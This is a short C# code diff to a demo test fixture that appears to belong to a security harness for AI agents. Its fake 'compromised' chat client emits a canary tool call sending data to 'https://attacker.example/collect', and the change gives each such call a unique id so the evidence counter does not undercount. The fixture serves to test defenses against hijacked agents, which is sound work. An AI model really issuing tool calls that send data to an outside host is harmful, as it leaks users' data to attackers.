@@ -57,13 +57,17 @@ internal static class GatekeeperDemoSut
     private sealed class DemoCompromisedChatClient : IChatClient
     {
         private readonly string _canaryName;
+        private int _callSeq;
 
         public DemoCompromisedChatClient(string canaryName) => _canaryName = canaryName;
 
         public Task<ChatResponse> GetResponseAsync(
             IEnumerable<ChatMessage> messages, ChatOptions? options = null, CancellationToken cancellationToken = default)
         {
-            var call = new FunctionCallContent("call_demo", _canaryName,
+            // A unique (monotonic) call id per emission — a constant id would collide across turns/probes and let
+            // ConversationExtractor overwrite pending calls (undercounting the tool-call evidence).
+            var callId = $"call_demo_{Interlocked.Increment(ref _callSeq)}";
+            var call = new FunctionCallContent(callId, _canaryName,
                 new Dictionary<string, object?> { ["destination"] = "https://attacker.example/collect" });
             var message = new ChatMessage(ChatRole.Assistant, new List<AIContent> { call });
             return Task.FromResult(new ChatResponse(message)
